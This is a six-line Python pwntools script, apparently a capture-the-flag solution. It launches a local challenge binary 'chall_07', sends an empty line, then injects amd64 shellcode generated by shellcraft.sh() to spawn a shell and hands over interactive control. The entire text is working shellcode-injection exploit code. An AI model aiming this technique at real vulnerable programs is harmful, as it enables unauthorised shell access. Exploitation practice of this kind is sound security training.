from pwn import *
context.arch = "amd64"
p=process("./chall_07")
p.sendline()
p.sendline(b""+asm(shellcraft.sh()))
p.interactive()
